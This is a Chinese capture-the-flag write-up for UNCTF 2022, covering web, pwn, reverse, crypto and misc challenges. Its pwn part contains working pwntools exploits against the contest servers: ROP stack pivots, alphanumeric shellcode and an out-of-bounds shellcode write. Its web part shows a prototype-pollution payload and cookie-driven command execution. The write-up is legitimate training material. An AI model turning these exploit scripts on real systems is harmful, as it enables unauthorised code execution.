Web
===

我太喜欢bilibili大学啦--中北大学
---------------------

进去之后是php的界面，flag在环境变量里面，题目没出好 ，直接搜索flag就得到了

ezgame-浙江师范大学
-------------

进入游戏，可以选择玩游戏，前期多加生命和个数即可，单体攻击别用，后面加攻击和能量，防御即可

也可以注意到有一个main.js，进去之后直接搜索UNCTF，然后把那一大段function，运行即可获得答案

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-cab205cd48cd446ae651f328b18b4cfd00fe36e1.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-154a33c39b3fdd75690a823ee96e55e80b7a32de.png)

UNCTF{c5f9a27d-6f88-49fb-a510-fe7b163f8dd3}

ezunseri-西华大学
-------------

```Python
<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ?>
```

flag{Y0u\_A3r\_so\_G9eaD\_hacker}

babynode-云南大学
-------------

简单的原型链污染，

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-efc4370b51ef91f6881c50fd096539a8df964541.png)

坑点在于\_\_proto\_\_的利用，关键是这个东西只有是json的时候才是键值对，python发包的话没问题，直接json打包发送即可，burp 发包要注意改掉content\_type

```HTTP
POST / HTTP/1.1
Host: 84e7cb72-3bbb-4ef4-974e-fd0304c8e609.node.yuzhian.com.cn
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 28

{"__proto__":{"id":"unctf"}}
```

签到-吉林警察学院
---------

这个纯脑洞，密码不变，爆破username，每一个都会获得数字，拼起来就是flag

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-af0e4cc41a0a83a694d8397e260e21f311247375.png)

302与深圳大学
--------

flag{thai\_

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-c728970d3211b0e403de89d8d3617ee5d3d597a9.png)

后半段flag，联想到前面的环境变量，猜了一手docker

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-a0fabcd0b0986410c8ea157b69e58cafe703b035.png)

运气不错直接拿到了flag flag{thai\_miku\_micgo\_qka\_WEB\_GOD}

我太喜欢bilibili大学啦修复版-中北大学
-----------------------

签到题的修复版 第一个hint在首页，base64解码为admin\_unctf.php

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-be7bf15383c651c33146063d91ee08357792bd5e.png)

访问后为登录框，源码中提示抓包，在header中找到第二个hint，base64解码后为登录框账户密码。

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-3a17f5284aa57951b87c159c36e12ba0c407f6eb.png)

登录后可以post账户密码，然后cookie传值执行sysytem。

这里ls /flag时无法得到文件列表，也无法cat，上马也不成功。

最后采用压缩flag文件夹到web目录下下载。

下载后flag文件中有一串密文，base64解密后为一个网址，访问主页信息可以看到flag

unctf{this\_is\_so\_easy}

Pwn
===

welcomeUNCTF2022
----------------

直接nc 然后输入 UNCTF&amp;2022即可

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-513f49dd4c3238ca7466836a2b627f100b4c4243.png)

UNCTF{8dc599ae-29da-4ea4-89e8-22e2483ab932}

石头剪刀布-西华大学
----------

先用c语言把随机数记下来

```C
#include <stdio.h>
#include <stdlib.h>

int main()
{
        srand(0xA);
        long int a;

        for (int i = 0; i<=100; i++)
        {
                a = rand() % 3;
                printf("%ld,",a);
        }

        return 0;
}
```

然后伪随机数直接输入答案即可

```Python

from time import sleep
log_level = 'debug'
from pwn import *

context.log_level = 'debug'
p = remote('node.yuzhian.com.cn','37792')
arry = [1,1,2,2,0,2,2,1,2,2,2,2,0,0,2,1,0,1,2,0,0,1,1,1,1,2,1,1,1,0,0,2,0,1,2,0,0,1,0,2,1,2,1,2,0,1,1,1,0,0,2,0,2,1,2,1,0,0,2,2,1,1,2,1,2,2,2,2,1,0,2,0,2,0,0,1,2,2,2,0,0,1,0,1,0,0,2,0,1,0,0,2,1,1,1,1,0,1,1,2,2]

p.recvuntil(b'Will you learn about something of pwn later?(y/n)\n')
p.sendline(b'y')

for i in range(len(arry)):
        p.recvuntil(b"\n")
        if arry[i] == 1:
                p.sendline(b'0')
        elif arry[i] == 2:
                p.sendline(b'1')
        elif arry[i] == 0:
                p.sendline(b'2')
        else:
                exit(0)
        p.recvuntil(b'!!!\n')
p.interactive()
```

move your heart-中国计量大学现代科
-------------------------

溢出空间不够，栈迁移再次使用read布置两次rop

```Python
from time import sleep
log_level = 'debug'
from pwn import *

context.log_level = 'debug'
# p = process('./move_your_heart')
p = remote('node.yuzhian.com.cn',39138)

pop_rbp_ret = 0x000000000040121d
# attach(p)
p.recvuntil(b'input a num:\n')
p.sendline(b'286129175')

p.recvuntil(b'gift:')
addr = int(p.recv(len(b'0x7fffff4161e0')),16)
print(hex(addr))

payload = b'/bin/sh\x00' + p64(0x00000000004013d3) + p64(addr) + p64(0x000000000040101a) + p64(addr+0x20+0x20) + p64(0x00000000004012BF)
# pause()
p.send(payload)
# pause()

payload1 = p64(0x0000000004010D0)+p64(0x0000000004012D6)*3+p64(addr)+p64(0x0000000004012D6)
# pause()

p.send(payload1)
# pause()
p.interactive()
```

唯一有问题的是第二次read的返回地址被改变了，所以全部填充leave ret来控制返回地址

checkin-珠海科技学院
--------------

整数溢出，多了一个负号判断，使用空格绕过即可

```Python
from time import sleep
log_level = 'debug'
from pwn import *

context.log_level = 'debug'
p = remote('node.yuzhian.com.cn','38255')
# p = process('./checkin')
p.recvuntil(b'name: \n')
p.sendline(b'Somkes')

# attach(p)
# pause()
p.recvuntil(b'Please input size: \n')
# pause()
p.send(b' -1')
# pause()
p.sendline(b'a'*0x60)
p.interactive()
```

int 0x80-中国计量大学现代科技学院
---------------------

纯字符shellcode

```Python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

p = remote('node.yuzhian.com.cn','32834')
p.recvuntil(b'hello pwn\n')
sc = b'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'
print(sc)
p.sendline(sc)
p.interactive()
```

fakehero-西华大学
-------------

越界写，题目给了mprotect，堆可执行，越界写返回地址为堆地址，然后写shellcode即可

```Python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

p = remote('node.yuzhian.com.cn','38040')
# p = process('prog')
def B(str1):
        return bytes(str1,encoding='utf-8')

def menu(idx):
        p.recvuntil(b'> \n')
        p.sendline(B(str(idx)))

def add(index,size,content):
        menu(1)
        p.recvuntil(b'index: \n')
        p.sendline(B(str(index)))
        p.recvuntil(b"Size: \n")
        p.sendline(B(str(size)))
        p.recvuntil("Content: \n")
        p.send(content)

offset = 9
shellcode = asm(shellcraft.sh())
# attach(p)
pause()
add(offset,0x100,shellcode)
pause()
menu(3)
pause()

p.interactive()
```

Re
==

whereisyourkey-广东海洋大学
---------------------

flag在v5数组里面，把关键判断改成jmp，这样就不会跳出了，然后直接运行程序或者调试就可以得到flag

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-3f0d371168cc9d60c07aeca2346d103ec523d989.png)

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-889fc9289471331764b719d5056854c13a3c04e2.png)

ezzzzre-广东海洋大学
--------------

upx脱壳

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-9011e101bdd2e5815e5589d9fe4ca209e2ad73bb.png)

```Python
x = 'HELLOCTF'
flag = ''
for i in x:
    flag += chr(2 * ord(i) - 69)
print(flag)
```

Sudoku-陆军工程大学
-------------

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-a0f753cda86bb81681975759a57312f1ad6af906.png)

跟踪到关键位置，ollydbg查看内存，得到数独的数据

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-b114600294378034d4bb1ce86cc5ed57c93ce380.jpeg)

```Python
vme = 50

UNCTF{chr(29+vme)chr(15+vme)chr(29+vme)chr(24+vme)chr(39+vme)chr(25+vme)chr(29+vme)chr(20+vme)chr(32+vme)}
```

Crypto
======

md5-1
-----

```Python
flag='UNCTF{%s}'%md5('x'.encode()).hexdigest()
# x不是一个字符是n个字符

for i in flag:
    with open('out.txt','a')as file:
        file.write(md5(i.encode()).hexdigest()+'\n')
```

字母有限，可以进行比对后爆破

```Python
index  = []
for i in range(256):
    index.append(md5(bytes([i])).hexdigest())
with open("out.txt","r") as f:
    lines = f.readlines()
    for i in lines:
        i = i.replace('\n','')
        print(chr(index.index(i)),end='')
UNCTF{e84fed028b9046fc0e8f080e96e72184}
```

Dddd
----

根据形式看，和莫斯代码类似，替换后进行解码

```Python
a = '110/01/0101/0/1101/0000100/0100/11110/111/110010/0/1111/10000/111/110010/1000/110/111/0/110010/00/00000/101/111/1/0000010'
a = a.replace('1','.').replace('0','-')
然后莫斯电码解码即可
```

caesar
------

因为知道开头是UNCTF,就可以直接知道偏倚

```Python
a = 'B6vAy{dhd_AOiZ_KiMyLYLUa_JlL/HY}'
al = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
ca = al.index('B') - al.index('U') 
for i in a:
    if i=='{' or i == '}' or i == '_':
        print(i,end='')
    else:
        print(al[(al.index(i)+19)%64],end='')
UNCTF{w0w_Th1s_d1fFerent_c4eSar}
```

md5-2
-----

每一个和前一个相关，思路和md5\_1一致，求出每个字符的md5后进行枚举

```Python
from hashlib import md5
'''
flag='UNCTF{%s}'%md5('x'.encode()).hexdigest()
# x不是一个字符是n个字符

md5_=[]
for i in flag:
    md5_.append(int(md5(i.encode()).hexdigest(),16))
print(md5_)

for i in range(0,len(md5_)):
    if i==0:
        with open('out.txt','a')as file:
            file.write(hex(md5_[i])[2:]+'\n')
    else:
         with open('out.txt','a')as file:
            file.write(hex(md5_[i]^md5_[i-1])[2:]+'\n')   
'''

index  = []
for i in range(256):
    index.append(int(md5(bytes([i])).hexdigest(),16))
with open('out.txt','r') as f:
    lines = f.readlines()
    flag = []
    flag.append(int(lines[0].replace('\n',''),16))
    lines = lines[1:]
    for i in range(len(lines)):
        t = int(lines[i].replace('\n',''),16)
        flag.append(flag[-1]^t)
    for i in flag:
        print(chr(index.index(i)),end='')
```

Single table
------------

```Python
ABCDEFGHIKLMNOPQRSTUVWXYZ
key="ABCD"
table=
[
    E,F,G,H,I,
    K,L,M,N,O,
    P,Q,R,S,T,
    U,V,W,X,Y,
    Z,A,B,C,D
]
明文=THE_CODE
整理为：TH EC OD EX
密文为：IS ZH TI UH
整理为：ISZ_HTIU

密文：ISZ_HTIUH
整理为：IS ZH TI UH
明文为：TH EC DO EX
整理为：THE_CODE
```

根据它的样例的密码表，可以得到现在的密码表如下

```Python

[
    B,C,D,E,F,
    G,H,I,K,M
    N,O,Q,R,S,
    T,U,V,W,X,
    Z,P,L,A,Y
]

key="PLAY"
OTUBM{BCQ_SPH_WOQA_UAYFMKLWS}
```

观察一下加密的形式，应该是构造一个矩形，然后取对角，方向和明文方向一致

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-c1b72941d6100e33226850d1966eac5d73289d7e.png)

比较麻烦的是同一列，不过因为组成单词，之后就可以直接推出来，需要注意的是，他还pad了一个字符，需要去除

```Python
UNCTF{GOD_YOU_KNOW_PLAYFAIR}
```

Multi table
-----------

```Python
from string import ascii_uppercase
from random import randint,shuffle
from binascii import b2a_hex,a2b_hex

flag="UNCTF{}"
#base_table=list(ascii_uppercase)
# shuffle(base_table)
#print(base_table)
base_table = ['J', 'X', 'I', 'S', 'E', 'C', 'R', 'Z', 'L', 'U', 'K', 'Q', 'Y', 'F', 'N', 'V', 'T', 'P', 'O', 'G', 'A', 'H', 'D', 'W', 'M', 'B']
table={}
for i in range(26):
    table[i]=ascii_uppercase[i:]+ascii_uppercase[:i]
print(table)
key=[]
for i in range(4):
    key.append(randint(0,25))
key = [9,15,23,16]
c=''
x=0
for i in range(len(flag)):
    if flag[i] in ascii_uppercase:
        c+=table[key[x%4]][base_table.index(flag[i])]
        x+=1
    else:
        c+=flag[i]
print(c)
```

key只有4位，又知道开头一定为UNCTF,可以直接写出key，之后进行求解

```Python
# ['J', 'X', 'I', 'S', 'E', 'C', 'R', 'Z', 'L', 'U', 'K', 'Q', 'Y', 'F', 'N', 'V', 'T', 'P', 'O', 'G', 'A', 'H', 'D', 'W', 'M', 'B']
c = 'SDCGW{MPN_VHG_AXHU_GERA_SM_EZJNDBWN_UZHETD}'
key = [9,15,23,16]
x = 0
flag = ''
print(c)
for i in range(len(c)):
    if c[i] in ascii_uppercase:
        for j in range(26):
            if table[key[x%4]][j] == c[i]:
                flag+=base_table[j]
        x+=1
    else:
        flag+=c[i]
#
print(flag)
UNCTF{WOW_YOU_KNOW_THIS_IS_VIGENERE_CIPHER}
```

easy\_RSA
---------

略

```Python
x = 358950849615278333731635244854025425463656033006805723630685
p = 8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857<<200
p = p+x
c=6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140 

n=102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553

q = n//p
from gmpy2 import *
from Crypto.Util.number import *
e = 0x10001

d = invert(e,(p-1)*(q-1))
print(long_to_bytes(pow(c,d,n)))
flag{It is a very_intersting_test!!!}
```

ezxor
-----

多次一密主要有个空格可以利用，空格异或字母还是字母，字母异或字母不是字母，然后密文和密文异或相当于明文和明文异或，所以统计一个位置如果多次异或后为字母，就可以判断为空格，之后利用这些不同位的空格就可以返回key的值。当然这会存在一些偏差，有些需要人工处理一些哎，一些常见单词进行补全就可以了。

```Python
'''from key import m,flag
'''
def xor(a, b):
    return "".join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])
def xor1(a, b):
    return "".join([chr(x ^ y) for (x, y) in zip(a, b)])
def OPT(key,crypto):
    ciphertext=xor(key,crypto)
    return ciphertext
'''
ls=[]

for i in range(11):
    ls.append(m[i*42:(i+1)*42])

for x in ls:
    k=OPT(flag,x).encode('hex')
    print(k)

'''
from gmpy2 import *
from Crypto.Util.number import *
c1 = [
0x1c2063202e1e795619300e164530104516182d28020005165e01494e0d,
0x2160631d325b3b421c310601453c190814162d37404510041b55490d5d,
0x3060631d325b3e59033a1252102c560207103b22020613450549444f5d,
0x3420277421122f55067f1207152f19170659282b090b56121701405318,
0x212626742b1434551b2b4105007f110c041c7f361c451e0a02440d010a,
0x75222a22230877102137045212300409165928264c091f131701484f5d,
0x21272d33661237441a7f005215331706175930254c0817091b4244011c,
0x303c2674311e795e103a05520d300600521831274c031f0b160148555d,
0x3c3d63232909355455300752033a17175e59372c1c0056111d01474813,
0x752b22272f1e2b10063e0816452b1e041c593b2c02005a450649440110,
0x396e2f3d201e795f137f07130c2b1e450510332f4c08170e17014d481b]

c = []
for i in c1:
    c.append((long_to_bytes(i)))
key = [0 for x in range(29)]

for i in range(11):
    b = []
    for j in range(11):
        if i!=j:
            b.append(xor1(c[i],c[j]))
    for t in range(29):
        count = 0 
        for j in range(10):
            if (b[j][t]>='A' and b[j][t]<='Z') or (b[j][t]>='a' and b[j][t]<='z'):
                count+=1
        if count >=6:

            key[t] = c[i][t]^32
for i in key:
    if i == 0:
        print(' ',end='')
        continue
    print(chr(i),end='')
key = b'UNCTF{Y0u_are_very_Clever!!!}'

```

ezRSA
-----

略

```Python
n = 62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561
e = 65537 
c = 56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504

import gmpy2
from Crypto.Util.number import *
print(gmpy2.iroot(n,4))
p = 89065756791595323358603857939783936930073695697065732353414009005162022399741
phi_n=p**4-p**3
d = gmpy2.invert(e,phi_n)
print(long_to_bytes(pow(c,d,n)))
b'unctf{pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s}'
```

babyRSA
-------

部分明文泄露，上脚本

```Python
n = 25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431
c = 15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107
m0 = 11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240
e = 6
kbits = 60

PR.<x> = PolynomialRing(Zmod(n))
f = (m0 + x)^e - c
f = f.monic()
x0 = f.small_roots(X=2^kbits,beta=1)[0] 
print(x0)

m = 445966543586681469+11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240
print(long_to_bytes(m))

b'UNCTF{27a0aac7-76cb-427d-9129-1476360d5d1b}'
```

Misc
====

magic\_word
-----------

改编码方式为utf-8

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-2122120142460b12e9a05a05c94872aab7c2dd16.png)

零宽解码

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-689feac51836837b0ed84810ce76dfba63c76590.png)

得到flag

unctf{We1come\_new\_ctfer}

syslog
------

解压打开syslog，搜索password，base64解码

得到flag

unctf{N1\_sH3\_D0n9\_L0g\_dE!}

巨鱼
--

修改图片高度，得到解压密码：无所谓我会出手

得到flag.txt和flagisnothere.zip

flag.txt里是假flag

然后修复flagisnothere.zip文件头

解压缩得到flag.pptx和pass.png

图是一个C6H6Cl6，尝试几次发现密码为666

最后一张ppt空白处藏有flag

UNCTF{y0u\_F1nd\_1t!}

社什么社
----

打开看着像是鼓楼，湖南人一下就觉得是凤凰古城，搜索发现确实比较符合

尝试md5然后提交，发现成功

UNCTF{4F0198127A45F66C07A5B1A2DDA8223C}

In\_the\_Morse\_Garden-陆军工程大学
-----------------------------

pdf里面藏了字母，ctrl+a 全部复制出来

```PHP
UNCTF{5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm
+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5
46b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlO
WPpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6Qg5L6d5Y+k5q+U5Y+k5L6d5Y+k
5q+U5Y+k546b5Y2h5be05Y2h546b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOeOm
+WNoeW3tOWNoeeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg546b5Y2h5be05Y
2h5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3
lj6Tmr5Tlj6Tkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg54
6b5Y2h5be05Y2h5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+k5L6d5Y+k5q+U5Y+kIOS+neWPpOavlOW
PpOeOm+WNoeW3tOWNoSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaEg5L6d5Y+k5q+U5Y
+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWNoSDkvp3lj6Tmr5Tlj6Tnjpvlja
Hlt7TljaEg5L6d5Y+k5q+U5Y+k546b5Y2h5be05Y2hIOS+neWPpOavlOWPpOeOm+WNoeW3tOWN
oSDnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHkvp3lj6Tmr5Tlj6TnjpvljaHlt7TljaHnjpvljaHlt7T
ljaE=}
```

然后把大括号里面的，base64解码得到

```PHP
依古比古玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古依古比古玛卡巴卡玛卡巴卡依古比古玛卡巴卡 玛卡巴卡依古比古依古比古依古比古 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 依古比古玛卡巴卡 玛卡巴卡依古比古玛卡巴卡依古比古玛卡巴卡玛卡巴卡
```

按照题目，莫斯密码，依古比古 和玛卡巴卡替换 . 和 - 然后解码

Flag

UNCTF{WAN\_AN\_MAKA\_BAKAAAAA!}

找得到我吗
-----

拿到是一个doc文档，文档藏东西一般就是隐藏了，或者藏在xml中，ctrl+a发现一堆没用的文字，然后改后缀为zip，解压之后，在word/document.xml里面发现了flag

![](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7d9f23afeaf3877db9c4ca2cb51f51e5ff4c0b6c.png)